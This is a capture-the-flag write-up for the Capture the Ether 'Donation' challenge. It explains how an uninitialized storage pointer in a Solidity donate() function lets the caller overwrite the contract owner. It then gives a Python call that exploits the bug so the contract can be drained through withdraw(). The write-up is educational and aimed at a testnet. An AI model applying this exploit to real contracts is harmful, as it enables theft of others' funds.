# Donation

## Objectives

>A candidate you don’t like is accepting campaign contributions via the smart contract below.
>To complete this challenge, steal the candidate’s ether.

## Solution

The function `donate()` contains a bug:

```js
function donate(uint256 etherAmount) public payable {
    // amount is in ether, but msg.value is in wei
    uint256 scale = 10**18 * 1 ether;
    require(msg.value == etherAmount / scale);

    Donation donation;
    donation.timestamp = now;
    donation.etherAmount = etherAmount;

    donations.push(donation);
}
```

The variable `donation` is not initialized, so it is defaulted to storage. As a result, `donation` now is a pointer that affects storage slot 0 (`donations`) and storage slot 1 (`owner`). As a result, whatever value is assigned to these two variables, but in particular, to `etherAmount`, will write to those two storage slots.

```js
donation.timestamp = now;
donation.etherAmount = etherAmount;
```

To complete the challenge, all you have to do is pass the uint conversion of your address divided by `scale` as `etherAmount`, after this, you can call `withdraw()` and drain the contract. 

In Python I did it as follows:

```python
donation.donate(acc.address, _from | {'value':floor(int(acc.address,16)//1e36)})
```

Where:

* `_from` is {'from':acc.address}
* `acc` is my loaded account through my private key (the account doing the capture the ether challenges)
* `floor()` is the floor function
* `//` is integer division
* `int(acc.address, 16)` is the conversion to int of my address (basically hexadecimal $\rightarrow$ decimal)


## Submission transaction

https://ropsten.etherscan.io/tx/0x5fc76f733f3384fa064f8d10acda683ca35cd683dc47781aa2e9d5ef9913f5b8
